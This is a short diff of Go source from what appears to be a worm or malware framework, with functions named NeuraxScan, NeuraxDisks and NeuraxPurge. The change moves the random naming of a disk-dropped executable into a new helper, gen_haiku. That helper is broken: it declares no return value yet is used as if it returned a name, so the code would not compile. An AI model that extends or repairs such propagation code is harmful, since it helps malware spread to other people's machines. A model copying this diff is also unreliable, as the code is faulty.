@@ -325,8 +325,7 @@ func NeuraxScan(c chan string) {
 }
 
 func NeuraxDisks() error {
-	haikunator := haikunator.New(time.Now().UTC().UnixNano())
-	selected_name := haikunator.Haikunate()
+	selected_name := gen_haiku()
 	if runtime.GOOS == "windows" {
 		selected_name += ".exe"
 	}
@@ -341,6 +340,11 @@ func NeuraxDisks() error {
 		}
 	}
 	return nil
+}
+
+func gen_haiku() {
+	haikunator := haikunator.New(time.Now().UTC().UnixNano())
+	selected_name := haikunator.Haikunate()
 }
 
 func NeuraxPurge() {
